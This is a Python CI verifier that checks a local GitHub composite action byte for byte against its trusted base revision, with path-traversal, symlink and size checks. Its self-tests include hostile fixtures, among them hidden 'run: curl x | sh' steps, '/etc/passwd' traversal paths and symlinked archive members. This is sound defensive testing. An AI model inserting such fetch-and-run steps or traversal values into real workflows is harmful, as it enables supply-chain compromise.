#!/usr/bin/env python3
"""Prove a local composite action matches its trusted base before it executes.

A local `uses: ./.github/actions/...` step runs repository-controlled code. When
a job later depends on what that action installed — the pinned `helm` binary the
chart runtime lint renders with — the action itself becomes part of the trusted
boundary: a pull request that edits the installer can hand the gate a fake
renderer and the gate would happily scan its output.

This verifier closes that hole *before* the action is allowed to run. The
workflow hands it a `git archive` tarball of the action directory taken from the
trusted revision (the pull request base, the merge-group base, or the checkout
itself on `push`/`workflow_dispatch`, where the checkout already is the trusted
revision). Every governed constraint is then decided from that manifest:

* every trusted member is a regular file (no symlink, device, or hard link),
* every trusted path stays inside the action directory and contains no `..`,
* the working-tree copy of each path is a regular, non-symlink file,
* contents match byte for byte (a YAML file may also differ in nothing but
  external action pins, see below) and the executable bit matches,
* the action directory holds no extra file and no symlink of any kind,
* every ancestor directory of the action is an ordinary directory.

Anything the manifest cannot answer — an empty archive, an unreadable file, an
unexpected member type — fails closed. The verifier deliberately spawns no
process and never reads a secret; the workflow performs the one `git archive`
invocation while the runner `PATH` is still the pristine one.

Byte identity is the only admission. Issue #3904's one-way move of
`.github/actions/setup-kubernetes-tools` to the PR #3910 generation is spent:
that generation is the trusted base, so an edit to the action must now match
the trusted tree.

An external `uses: owner/repo@<40-hex sha>` pin inside a YAML file is not part
of that identity: a file that differs from the trusted bytes only in such pins
(commit and trailing comment) still matches. Which upstream release commit a
pin names is decided by the trusted action pin rotation check in
`verify_cross_build_policy.py`, the required `Trusted Cross Build Policy` gate
(docs/dependency-policy.md → "Automated action pin rotation"); this gate keeps
freezing what the action runs and how.

Usage:
  python3 -I .github/scripts/verify_trusted_local_action.py --self-test
  python3 -I .github/scripts/verify_trusted_local_action.py \
      --action-path .github/actions/setup-kubernetes-tools \
      --trusted-archive "$RUNNER_TEMP/trusted-k8s-tools.tar"
"""

from __future__ import annotations

import argparse
import io
import os
import re
import stat
import sys
import tarfile
import tempfile
from pathlib import Path, PurePosixPath

# Git tracks only the executable bit for regular blobs (100644 / 100755), while
# its default tar writer represents those as 0664 / 0775. Accept both canonical
# filesystem and archive spellings, but no other permission shape; executable
# parity with the checkout is still checked below. Anything else (including a
# symlink 120000 or gitlink 160000) is not an input this verifier will execute.
TRUSTED_FILE_MODES = frozenset((0o644, 0o664, 0o755, 0o775))
# Same normalization as `verify_cross_build_policy.normalize_action_pins`; this
# checker is extracted and run alone, so it cannot import it.
PINNED_ACTION_SHA_PLACEHOLDER = "0" * 40
EXTERNAL_ACTION_PIN = re.compile(
    r"(?m)^(?P<lead>[ \t]*(?:-[ \t]+)?uses:[ \t]+)(?P<quote>['\"]?)"
    r"(?P<action>[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9_.-]+"
    r"(?:/[A-Za-z0-9_.-]+)*)@(?P<sha>[0-9a-f]{40})(?P=quote)"
    r"(?P<comment>[ \t]+#[^\n]*)?[ \t]*$"
)
PIN_NORMALIZED_SUFFIXES = frozenset({".yml", ".yaml"})
# Unicode line/paragraph separators the GitHub runner's YAML parser
# treats as line breaks but Python's `re` does not: inside a pin comment
# they would hide an executable step from this comparison (#6689). Keep
# in step with verify_cross_build_policy.YAML_UNICODE_LINE_BREAKS.
YAML_UNICODE_LINE_BREAKS = ("\u0085", "\u2028", "\u2029")
# A lone carriage return is another line break to the runner, and the pin
# comment's `[^\n]*` group swallows it plus everything after it on the
# line, hiding an executable step from this comparison (#6752). CRLF is
# still accepted: each `\r` there is followed by `\n`, which ends the
# comment group. verify_cross_build_policy reads text through
# `Path.read_text()`, whose universal-newline translation already turns a
# bare `\r` into `\n`, so it needs no equivalent byte-level check.
BARE_CARRIAGE_RETURN = re.compile(r"\r(?!\n)")


def pin_only_difference(relative: str, expected: bytes, actual: bytes) -> bool:
    """True when a YAML input differs from the trusted bytes only in pins."""

    if PurePosixPath(relative).suffix.lower() not in PIN_NORMALIZED_SUFFIXES:
        return False
    try:
        trusted = expected.decode("utf-8")
        local = actual.decode("utf-8")
    except UnicodeDecodeError:
        return False
    if any(separator in trusted or separator in local for separator in YAML_UNICODE_LINE_BREAKS):
        return False
    if BARE_CARRIAGE_RETURN.search(trusted) or BARE_CARRIAGE_RETURN.search(local):
        return False

    def normalize(contents: str) -> str:
        return EXTERNAL_ACTION_PIN.sub(
            lambda match: (
                f"{match['lead']}{match['quote']}{match['action']}"
                f"@{PINNED_ACTION_SHA_PLACEHOLDER}{match['quote']}"
            ),
            contents,
        )

    return normalize(trusted) == normalize(local)


# Bound a hostile archive so a crafted manifest cannot exhaust the runner.
MAX_ARCHIVE_MEMBERS = 4096
MAX_MEMBER_BYTES = 8 * 1024 * 1024

class TrustedActionError(Exception):
    """A fail-closed condition: the local action cannot be trusted to run."""


def normalize_action_path(action_path: str) -> PurePosixPath:
    """Reject an action path that is absolute, empty, or contains `..`."""

    raw = action_path.strip().replace("\\", "/")
    if not raw:
        raise TrustedActionError("action path must not be empty")
    if raw.startswith("/") or (
        len(raw) >= 3 and raw[1] == ":" and raw[2] == "/"
    ):
        raise TrustedActionError(f"action path must be relative: {action_path}")
    text = raw.rstrip("/")
    if not text:
        raise TrustedActionError("action path must not be empty")
    if any(part in ("", "..", ".") for part in text.split("/")):
        raise TrustedActionError(
            f"action path must not contain empty, '..', or '.' components: "
            f"{action_path}"
        )
    candidate = PurePosixPath(text)
    if candidate.is_absolute():
        raise TrustedActionError(f"action path must be relative: {action_path}")
    return candidate


def member_path(member_name: str) -> PurePosixPath:
    """Validate one archive member name as a relative, traversal-free path."""

    raw = member_name.replace("\\", "/")
    if not raw:
        raise TrustedActionError("trusted archive contains an unnamed member")
    if raw.startswith("/") or (
        len(raw) >= 3 and raw[1] == ":" and raw[2] == "/"
    ):
        raise TrustedActionError(
            f"trusted archive member is absolute: {member_name}"
        )
    text = raw.rstrip("/")
    if not text:
        raise TrustedActionError("trusted archive contains an unnamed member")
    if any(part in ("", "..", ".") for part in text.split("/")):
        raise TrustedActionError(
            f"trusted archive member contains an empty, '..', or '.' component: "
            f"{member_name}"
        )
    candidate = PurePosixPath(text)
    if candidate.is_absolute():
        raise TrustedActionError(f"trusted archive member is absolute: {member_name}")
    return candidate


def is_ancestor(candidate: PurePosixPath, action_dir: PurePosixPath) -> bool:
    """Return whether `candidate` is a parent directory of the action path.

    `git archive <ref> -- <dir>` emits a directory entry for every leading
    component of the pathspec, so those ancestors are expected structure rather
    than an escape.
    """

    return action_dir.parts[: len(candidate.parts)] == candidate.parts


def read_trusted_manifest(
    archive: tarfile.TarFile,
    action_dir: PurePosixPath,
) -> dict[str, tuple[bool, bytes]]:
    """Read `git archive` output into `relative path -> (executable, bytes)`."""

    manifest: dict[str, tuple[bool, bytes]] = {}
    members = 0
    for member in archive:
        members += 1
        if members > MAX_ARCHIVE_MEMBERS:
            raise TrustedActionError(
                f"trusted archive has more than {MAX_ARCHIVE_MEMBERS} members"
            )
        candidate = member_path(member.name)
        if member.isdir():
            if not is_ancestor(candidate, action_dir) and not is_ancestor(
                action_dir, candidate
            ):
                raise TrustedActionError(
                    f"trusted archive directory escapes "
                    f"{action_dir.as_posix()}: {member.name}"
                )
            continue
        if candidate == action_dir:
            raise TrustedActionError(
                f"trusted archive records {action_dir.as_posix()} as a non-directory"
            )
        try:
            relative = candidate.relative_to(action_dir)
        except ValueError as exc:
            raise TrustedActionError(
                f"trusted archive member escapes "
                f"{action_dir.as_posix()}: {member.name}"
            ) from exc
        key = relative.as_posix()
        if not member.isfile():
            raise TrustedActionError(
                f"trusted action input must be a regular file: {key}"
            )
        permissions = member.mode & 0o777
        if permissions not in TRUSTED_FILE_MODES:
            raise TrustedActionError(
                f"trusted action input has an unsupported file mode "
                f"{permissions:o}: {key}"
            )
        if member.size > MAX_MEMBER_BYTES:
            raise TrustedActionError(
                f"trusted action input exceeds {MAX_MEMBER_BYTES} bytes: {key}"
            )
        if key in manifest:
            raise TrustedActionError(f"trusted archive lists {key} twice")
        stream = archive.extractfile(member)
        if stream is None:
            raise TrustedActionError(f"trusted action input is unreadable: {key}")
        with stream:
            payload = stream.read(MAX_MEMBER_BYTES + 1)
        if len(payload) != member.size:
            raise TrustedActionError(
                f"trusted action input size does not match its header: {key}"
            )
        manifest[key] = (bool(permissions & 0o111), payload)
    if not manifest:
        raise TrustedActionError(
            f"trusted revision has no files under {action_dir.as_posix()}"
        )
    return manifest


def load_trusted_manifest(
    archive_path: Path,
    action_dir: PurePosixPath,
) -> dict[str, tuple[bool, bytes]]:
    if archive_path.is_symlink() or not archive_path.is_file():
        raise TrustedActionError(
            f"trusted archive must be a regular file: {archive_path}"
        )
    try:
        with tarfile.open(archive_path, mode="r:") as archive:
            return read_trusted_manifest(archive, action_dir)
    except tarfile.TarError as exc:
        raise TrustedActionError(f"trusted archive is unreadable: {exc}") from exc


def local_action_files(root: Path, action_dir: PurePosixPath) -> dict[str, Path]:
    """Enumerate the working-tree action, rejecting every non-regular entry."""

    ancestors: list[PurePosixPath] = []
    for index in range(1, len(action_dir.parts) + 1):
        ancestors.append(PurePosixPath(*action_dir.parts[:index]))
    for ancestor in ancestors:
        directory = root / ancestor
        if directory.is_symlink() or not directory.is_dir():
            raise TrustedActionError(
                f"local action path must be an ordinary directory: "
                f"{ancestor.as_posix()}"
            )

    action_root = root / action_dir
    discovered: dict[str, Path] = {}
    for current, directories, files in os.walk(action_root, followlinks=False):
        current_path = Path(current)
        for name in directories:
            if (current_path / name).is_symlink():
                relative = (current_path / name).relative_to(action_root)
                raise TrustedActionError(
                    f"local action must not contain a symlinked directory: "
                    f"{relative.as_posix()}"
                )
        for name in files:
            path = current_path / name
            relative = path.relative_to(action_root).as_posix()
            if path.is_symlink():
                raise TrustedActionError(
                    f"local action must not contain a symlink: {relative}"
                )
            if not path.is_file():
                raise TrustedActionError(
                    f"local action input must be a regular file: {relative}"
                )
            discovered[relative] = path
    return discovered


def read_bounded_local_payload(
    path: Path,
    *,
    limit: int = MAX_MEMBER_BYTES,
    expected_executable: bool | None = None,
) -> bytes:
    """Read a candidate file without exceeding `limit` bytes.

    The read itself is capped at `limit + 1`. An oversize file, a short
    read, or a size that changes after the read fails closed. A prefix of
    a larger file is never returned. Size is not used as a permission to
    perform an unbounded read.
    """

    if limit < 0:
        raise TrustedActionError("local action read limit is invalid")
    try:
        with path.open("rb") as handle:
            before = os.fstat(handle.fileno())
            if not stat.S_ISREG(before.st_mode):
                raise TrustedActionError(
                    "local action input must remain a regular file"
                )
            executable = bool(
                before.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
            )
            if (
                expected_executable is not None
                and executable != expected_executable
            ):
                raise TrustedActionError(
                    "local action executable bit changed before bounded read"
                )
            if before.st_size > limit:
                raise TrustedActionError(
                    f"local action input exceeds {limit} bytes"
                )
            payload = handle.read(limit + 1)
            after = os.fstat(handle.fileno())
    except OSError as exc:
        raise TrustedActionError(
            f"unreadable local action input ({exc})"
        ) from exc
    if len(payload) > limit:
        raise TrustedActionError(f"local action input exceeds {limit} bytes")
    stable_fields = (
        "st_dev",
        "st_ino",
        "st_mode",
        "st_size",
        "st_mtime_ns",
        "st_ctime_ns",
    )
    if any(
        getattr(before, field) != getattr(after, field)
        for field in stable_fields
    ):
        raise TrustedActionError("local action input changed during bounded read")
    if after.st_size != len(payload):
        raise TrustedActionError(
            "local action input size does not match the bytes read"
        )
    return payload


def verify_local_action(
    root: Path,
    action_dir: PurePosixPath,
    manifest: dict[str, tuple[bool, bytes]],
) -> list[str]:
    """Return every way the working tree differs from the trusted manifest."""

    findings: list[str] = []
    discovered = local_action_files(root, action_dir)

    for relative in sorted(set(discovered) - set(manifest)):
        findings.append(f"{relative}: not present on the trusted revision")
    for relative in sorted(set(manifest) - set(discovered)):
        findings.append(f"{relative}: missing from the local action tree")

    for relative in sorted(set(manifest) & set(discovered)):
        executable, expected = manifest[relative]
        path = discovered[relative]
        try:
            actual = read_bounded_local_payload(
                path,
                limit=MAX_MEMBER_BYTES,
                expected_executable=executable,
            )
        except (TrustedActionError, OSError) as exc:
            findings.append(f"{relative}: unreadable local action input ({exc})")
            continue
        if actual != expected and not pin_only_difference(relative, expected, actual):
            findings.append(f"{relative}: differs from the trusted revision")
    return findings


def _write(path: Path, contents: bytes, *, executable: bool = False) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(contents)
    path.chmod(0o755 if executable else 0o644)


def _archive_bytes(
    action_dir: str,
    entries: list[tuple[str, bytes, int]],
    *,
    extra: list[tarfile.TarInfo] | None = None,
) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        # `git archive <ref> -- <dir>` emits a directory entry for every leading
        # component of the pathspec, so the fixture reproduces that shape.
        parts = PurePosixPath(action_dir).parts
        for depth in range(1, len(parts) + 1):
            directory = tarfile.TarInfo(name=PurePosixPath(*parts[:depth]).as_posix())
            directory.type = tarfile.DIRTYPE
            directory.mode = 0o755
            archive.addfile(directory)
        for name, payload, mode in entries:
            info = tarfile.TarInfo(name=f"{action_dir}/{name}")
            info.size = len(payload)
            info.mode = mode
            archive.addfile(info, io.BytesIO(payload))
        for info in extra or []:
            archive.addfile(info)
    return buffer.getvalue()


def _manifest_from_bytes(
    payload: bytes,
    action_dir: PurePosixPath,
) -> dict[str, tuple[bool, bytes]]:
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:") as archive:
        return read_trusted_manifest(archive, action_dir)


_ACTION_DIR = ".github/actions/setup-kubernetes-tools"
_ACTION_YML = b"name: setup\nruns:\n  using: composite\n  steps: []\n"
_HELPER_SH = b"#!/bin/sh\necho helper\n"


def _clean_worktree(root: Path) -> None:
    _write(root / _ACTION_DIR / "action.yml", _ACTION_YML)
    _write(root / _ACTION_DIR / "bin" / "helper.sh", _HELPER_SH, executable=True)


def run_self_test() -> list[str]:
    """Synthetic manifests and worktrees: only an exact match is accepted."""

    failures: list[str] = []
    pinned = (
        b"runs:\n  using: composite\n  steps:\n"
        b"    - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0\n"
    )
    rotated = pinned.replace(
        b"55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0",
        b"1111111111111111111111111111111111111111 # v6.2.0",
    )
    if not pin_only_difference("action.yml", pinned, rotated):
        failures.append("an LF action pin rotation must match the trusted YAML")
    if not pin_only_difference(
        "action.yml",
        pinned.replace(b"\n", b"\r\n"),
        rotated.replace(b"\n", b"\r\n"),
    ):
        failures.append("a CRLF action pin rotation must match the trusted YAML")
    for label, relative, local in (
        (
            "a step hidden after a Unicode line break in the pin comment",
            "action.yml",
            pinned.replace(
                b" # v6.1.0\n",
                " # v6.1.0\u2028    - run: curl x | sh\n".encode(),
            ),
        ),
        (
            "a step hidden after a bare carriage return in the pin comment",
            "action.yml",
            pinned.replace(
                b" # v6.1.0\n",
                b" # v6.1.0\r    - run: curl x | sh\n",
            ),
        ),
        ("a step edit", "action.yml", rotated + b"    - run: curl x | sh\n"),
        ("a mutable ref", "action.yml", pinned.replace(
            b"55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0", b"v6"
        )),
        ("a different action", "action.yml", rotated.replace(b"actions/cache", b"evil/cache")),
        ("a non-YAML file", "install.sh", rotated),
    ):
        if pin_only_difference(relative, pinned, local):
            failures.append(f"{label} must not pass as a pin-only difference")
    # Compared against a CRLF trusted baseline so the only difference is
    # the hidden step: against the LF `pinned` the line endings alone would
    # already differ and the case would pass without the bare-CR guard.
    pinned_crlf = pinned.replace(b"\n", b"\r\n")
    if pin_only_difference(
        "action.yml",
        pinned_crlf,
        pinned_crlf.replace(
            b" # v6.1.0\r\n",
            b" # v6.1.0\r    - run: curl x | sh\r\n",
        ),
    ):
        failures.append(
            "a step hidden after a bare carriage return in a CRLF pin comment "
            "must not pass as a pin-only difference"
        )
    action_dir = normalize_action_path(_ACTION_DIR)
    entries = [
        # `git archive`'s default tar modes for tracked 100644 / 100755 blobs.
        ("action.yml", _ACTION_YML, 0o664),
        ("bin/helper.sh", _HELPER_SH, 0o775),
    ]
    manifest = _manifest_from_bytes(_archive_bytes(_ACTION_DIR, entries), action_dir)
    if set(manifest) != {"action.yml", "bin/helper.sh"}:
        failures.append(f"trusted manifest lost nested inputs: {sorted(manifest)}")
    if manifest.get("bin/helper.sh", (False, b""))[0] is not True:
        failures.append("trusted manifest lost the executable bit")

    for label, path in (
        ("absolute", "/etc/passwd"),
        ("Windows absolute", "C:\\Windows\\System32"),
        ("parent traversal", ".github/../../etc"),
        ("dot component", ".github/./actions"),
        ("empty component", ".github//actions"),
        ("empty", "   "),
    ):
        try:
            normalize_action_path(path)
        except TrustedActionError:
            pass
        else:
            failures.append(f"{label} action path was accepted")

    symlink_member = tarfile.TarInfo(name=f"{_ACTION_DIR}/link.yml")
    symlink_member.type = tarfile.SYMTYPE
    symlink_member.linkname = "../../../etc/passwd"
    escaping_member = tarfile.TarInfo(name=f"{_ACTION_DIR}/../escape.yml")
    escaping_member.size = 0
    sibling_member = tarfile.TarInfo(name=".github/actions/other-action/action.yml")
    sibling_member.size = 0
    absolute_member = tarfile.TarInfo(name=f"/{_ACTION_DIR}/absolute.yml")
    absolute_member.size = 0
    dotted_member = tarfile.TarInfo(name=f"{_ACTION_DIR}/./dotted.yml")
    dotted_member.size = 0
    escaping_directory = tarfile.TarInfo(name=".github/workflows")
    escaping_directory.type = tarfile.DIRTYPE
    escaping_directory.mode = 0o755
    hostile_archives = {
        "symlinked trusted member": _archive_bytes(
            _ACTION_DIR, entries, extra=[symlink_member]
        ),
        "escaping trusted member": _archive_bytes(
            _ACTION_DIR, entries, extra=[escaping_member]
        ),
        "sibling action member": _archive_bytes(
            _ACTION_DIR, entries, extra=[sibling_member]
        ),
        "absolute trusted member": _archive_bytes(
            _ACTION_DIR, entries, extra=[absolute_member]
        ),
        "dotted trusted member": _archive_bytes(
            _ACTION_DIR, entries, extra=[dotted_member]
        ),
        "escaping trusted directory": _archive_bytes(
            _ACTION_DIR, entries, extra=[escaping_directory]
        ),
        "empty trusted tree": _archive_bytes(_ACTION_DIR, []),
    }
    for label, payload in hostile_archives.items():
        try:
            _manifest_from_bytes(payload, action_dir)
        except TrustedActionError:
            pass
        else:
            failures.append(f"{label} was accepted")

    with tempfile.TemporaryDirectory(prefix="ferrum-trusted-local-action-") as tmp:
        clean = Path(tmp) / "clean"
        _clean_worktree(clean)
        try:
            findings = verify_local_action(clean, action_dir, manifest)
        except TrustedActionError as exc:
            failures.append(f"matching action tree raised: {exc}")
        else:
            if findings:
                failures.append(f"matching action tree was rejected: {findings}")
        modified = Path(tmp) / "modified"
        _clean_worktree(modified)
        _write(
            modified / _ACTION_DIR / "action.yml",
            _ACTION_YML + b"# substituted installer\n",
        )
        if not verify_local_action(modified, action_dir, manifest):
            failures.append("modified action input was accepted")

        remoded = Path(tmp) / "remoded"
        _clean_worktree(remoded)
        (remoded / _ACTION_DIR / "bin" / "helper.sh").chmod(0o644)
        if not verify_local_action(remoded, action_dir, manifest):
            failures.append("changed executable bit was accepted")

        extra = Path(tmp) / "extra"
        _clean_worktree(extra)
        _write(extra / _ACTION_DIR / "bin" / "extra.sh", b"#!/bin/sh\n")
        if not verify_local_action(extra, action_dir, manifest):
            failures.append("extra local action file was accepted")

        removed = Path(tmp) / "removed"
        _clean_worktree(removed)
        (removed / _ACTION_DIR / "bin" / "helper.sh").unlink()
        if not verify_local_action(removed, action_dir, manifest):
            failures.append("missing local action file was accepted")

        symlinked_file = Path(tmp) / "symlinked-file"
        _clean_worktree(symlinked_file)
        target = symlinked_file / "outside-action.yml"
        _write(target, _ACTION_YML)
        replaced = symlinked_file / _ACTION_DIR / "action.yml"
        replaced.unlink()
        try:
            replaced.symlink_to(target)
        except (NotImplementedError, OSError):
            # Some non-Linux developer environments do not permit symlinks.
            pass
        else:
            try:
                verify_local_action(symlinked_file, action_dir, manifest)
            except TrustedActionError:
                pass
            else:
                failures.append("symlinked local action file was accepted")

        symlinked_dir = Path(tmp) / "symlinked-dir"
        _clean_worktree(symlinked_dir)
        outside = Path(tmp) / "outside-tree"
        _write(outside / "payload.sh", b"#!/bin/sh\n")
        try:
            (symlinked_dir / _ACTION_DIR / "vendor").symlink_to(
                outside, target_is_directory=True
            )
        except (NotImplementedError, OSError):
            pass
        else:
            try:
                verify_local_action(symlinked_dir, action_dir, manifest)
            except TrustedActionError:
                pass
            else:
                failures.append("symlinked local action directory was accepted")

        symlinked_root = Path(tmp) / "symlinked-root"
        relocated = Path(tmp) / "relocated-action"
        _write(relocated / "action.yml", _ACTION_YML)
        action_root = symlinked_root / _ACTION_DIR
        action_root.parent.mkdir(parents=True, exist_ok=True)
        try:
            action_root.symlink_to(relocated, target_is_directory=True)
        except (NotImplementedError, OSError):
            pass
        else:
            try:
                verify_local_action(symlinked_root, action_dir, manifest)
            except TrustedActionError:
                pass
            else:
                failures.append("symlinked local action root was accepted")

        missing_root = Path(tmp) / "missing-root"
        (missing_root / ".github" / "actions").mkdir(parents=True)
        try:
            verify_local_action(missing_root, action_dir, manifest)
        except TrustedActionError:
            pass
        else:
            failures.append("absent local action directory was accepted")

        archive_path = Path(tmp) / "not-a-tar"
        _write(archive_path, b"definitely not a tar archive\n")
        try:
            load_trusted_manifest(archive_path, action_dir)
        except TrustedActionError:
            pass
        else:
            failures.append("malformed trusted archive was accepted")

        try:
            load_trusted_manifest(Path(tmp) / "absent.tar", action_dir)
        except TrustedActionError:
            pass
        else:
            failures.append("missing trusted archive was accepted")

        failures.extend(_bounded_reader_self_tests(Path(tmp)))

    return failures


def _bounded_reader_self_tests(tmp: Path) -> list[str]:
    failures: list[str] = []
    bounded_oversize = tmp / "bounded-reader-oversize.bin"
    # First six bytes are a legal payload; the extra suffix must not be
    # returned as an accepted prefix of an over-limit file.
    bounded_oversize.write_bytes(b"prefixXXXX")
    try:
        read_bounded_local_payload(bounded_oversize, limit=6)
    except TrustedActionError:
        pass
    else:
        failures.append("bounded reader accepted an over-limit payload")

    bounded_exact = tmp / "bounded-reader-exact.bin"
    bounded_exact.write_bytes(b"prefix")
    try:
        payload = read_bounded_local_payload(bounded_exact, limit=6)
    except TrustedActionError as exc:
        failures.append(f"bounded reader rejected an in-limit payload: {exc}")
    else:
        if payload != b"prefix":
            failures.append("bounded reader returned the wrong in-limit payload")

    return failures


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Verify a local composite action matches its trusted base "
            "revision before the workflow executes it"
        )
    )
    parser.add_argument(
        "--action-path",
        default=None,
        help="repository-relative local action directory",
    )
    parser.add_argument(
        "--trusted-archive",
        type=Path,
        default=None,
        help="`git archive` tarball of the action directory on the trusted revision",
    )
    parser.add_argument(
        "--root",
        type=Path,
        default=None,
        help="repository root holding the working-tree action (default: cwd)",
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="run synthetic manifest/worktree fixtures",
    )
    args = parser.parse_args(argv)

    if args.self_test:
        failures = run_self_test()
        for failure in failures:
            print(f"::error::self-test: {failure}", file=sys.stderr)
        if failures:
            return 1
        print("trusted local action verifier self-test passed")
        return 0

    if args.action_path is None or args.trusted_archive is None:
        print(
            "::error::--action-path and --trusted-archive are required",
            file=sys.stderr,
        )
        return 1

    root = (args.root or Path.cwd()).resolve()
    try:
        action_dir = normalize_action_path(args.action_path)
        manifest = load_trusted_manifest(args.trusted_archive, action_dir)
        findings = verify_local_action(root, action_dir, manifest)
    except (TrustedActionError, OSError, ValueError) as exc:
        print(
            f"::error::trusted local action check failed closed: {exc}",
            file=sys.stderr,
        )
        return 1

    for finding in findings:
        print(f"::error::{action_dir.as_posix()}/{finding}", file=sys.stderr)
    if findings:
        return 1
    print(
        f"{action_dir.as_posix()} matches the trusted revision "
        f"({len(manifest)} governed files)"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
